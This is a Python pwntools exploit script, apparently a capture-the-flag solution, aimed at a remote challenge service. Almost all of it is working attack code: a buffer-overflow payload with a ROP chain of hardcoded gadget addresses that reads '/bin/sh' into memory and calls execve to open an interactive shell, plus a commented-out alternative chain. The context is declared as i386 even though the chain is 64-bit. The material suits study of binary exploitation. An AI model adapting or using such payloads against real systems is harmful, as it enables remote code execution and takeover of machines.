#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.cyber.jawara.systems --port 13372
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.cyber.jawara.systems'
port = int(args.PORT or 13372)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
pop_rax=0x00000000004155a4
pop_rdx=0x00000000004497c5
pop_rdi=0x0000000000400696
pop_rsi=0x0000000000410183
syscall=0x000000000047b52f

gets = 0x0000000000410320
p="a"*16
p+=p64(pop_rdi)
p+=p64(0x00000000006bb2e0)
p+=p64(gets)
p+=p64(pop_rax)
p+=p64(59)
p+=p64(pop_rdi)
p+=p64(0x00000000006bb2e0)
p+=p64(pop_rsi)
p+=p64(0)
p+=p64(pop_rdx)
p+=p64(0)
p+=p64(syscall)

io.sendlineafter("bytes Anda:",p)
io.sendline("/bin/sh\x00")

io.interactive()

mov=0x00000000004182d7
# mov qword ptr [rdx], rax ; ret
# p+=p64(pop_rdx)
# p+=p64(0x00000000006bb2e0)
# p+=p64(pop_rax)
# p+="/bin/sh\x00"
# p+=p64(mov)
# p+=p64(pop_rax)
# p+=p64(59)
# p+=p64(pop_rdi)
# p+=p64(0x00000000006bb2e0)
# p+=p64(pop_rsi)
# p+=p64(0)
# p+=p64(pop_rdx)
# p+=p64(0)
# p+=p64(syscall)

